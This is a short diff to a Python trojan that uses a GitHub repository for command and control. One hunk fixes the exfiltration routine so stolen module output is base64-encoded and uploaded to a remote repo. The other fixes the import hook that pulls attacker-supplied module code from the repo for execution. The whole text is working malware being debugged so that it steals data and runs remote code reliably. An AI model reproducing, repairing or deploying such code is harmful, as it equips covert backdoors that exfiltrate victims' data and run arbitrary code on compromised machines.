@@ -60,7 +60,7 @@ def store_module_result(data):
 
     gh,repo,branch=connect_to_github()
     remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
-    repo.create_file(remote_path,"Commite message",base64.b64decode(data))
+    repo.create_file(remote_path,"Commite message",base64.b64encode(data))
 
     return
 
@@ -72,7 +72,7 @@ class GitImport(object):
     def find_module(self,fullname,path=None):
         if configured:
             print "[*] Attempting to retrieve %s" % fullname
-            new_library=get_file_contents("modules/%s" %s fullname)
+            new_library=get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
                 self.current_module_code=base64.b64decode(new_library)
